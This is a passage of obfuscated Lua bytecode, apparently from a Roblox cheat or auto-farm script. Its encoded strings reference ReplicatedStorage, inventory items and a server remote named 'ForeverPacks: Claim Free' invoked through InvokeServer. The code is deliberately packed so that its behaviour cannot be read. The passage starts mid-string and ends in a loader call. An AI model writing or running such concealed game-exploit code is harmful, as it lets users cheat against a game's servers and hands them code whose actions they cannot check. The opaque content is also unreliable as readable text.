03053Q004974656D7303123Q00526F77202D20466F7265766572205061636B03043Q005061636B03053Q0054696C6573000F3Q00122E3Q00013Q0020385Q0002001214000200034Q00033Q0002000200201A5Q000400201A5Q000500201A5Q000600201A5Q000700201A5Q000800201A5Q000900201A5Q000A00201A5Q000B00201A5Q000C2Q00438Q000E3Q00017Q00063Q0003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E7403043Q005361766500093Q00122E3Q00013Q0020385Q0002001214000200034Q00033Q0002000200201A5Q000400201A5Q000500201A5Q00062Q00438Q000E3Q00017Q00073Q00028Q0003043Q006E657874030B3Q004765744368696C6472656E03063Q00486F6C64657203083Q004974656D536C6F7403043Q0049636F6E03053Q00496D61676500233Q0012143Q00014Q0032000100013Q00260A3Q00020001000100040B3Q00020001001214000100013Q00260A000100050001000100040B3Q0005000100122E000200024Q001900035Q0020380003000300032Q002700030002000400040B3Q001B0001001214000700014Q0032000800083Q00260A0007000E0001000100040B3Q000E000100201A00090006000400201A00090009000500201A00080009000600201A0009000800072Q0019000A00013Q0006350009001B0001000A00040B3Q001B00012Q0016000900014Q0023000900023Q00040B3Q001B000100040B3Q000E000100063B0002000C0001000200040B3Q000C00012Q001600026Q0023000200023Q00040B3Q0005000100040B3Q0022000100040B3Q000200012Q000E3Q00017Q00073Q0003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004E6574776F726B03183Q00466F72657665725061636B733A20436C61696D2046722Q65030C3Q00496E766F6B6553657276657203073Q0044656661756C74000A3Q00122E3Q00013Q0020385Q0002001214000200034Q00033Q0002000200201A5Q000400201A5Q00050020385Q0006001214000200074Q001F3Q000200012Q000E3Q00017Q00073Q00028Q0003043Q006E65787403093Q00496E76656E746F7279030A3Q00436F6E73756D61626C6503053Q007461626C6503043Q0066696E6403023Q00696400173Q0012143Q00013Q000E290001000100013Q00040B3Q0001000100122E000100024Q001900025Q00201A00020002000300201A0002000200042Q0032000300033Q00040B3Q0011000100122E000600053Q00201A0006000600062Q0019000700013Q00201A0008000500072Q00030006000800020006180006001100013Q00040B3Q001100012Q0023000400023Q00063B000100090001000200040B3Q000900012Q001600016Q0023000100023Q00040B3Q000100012Q000E3Q00017Q00",v9(),...);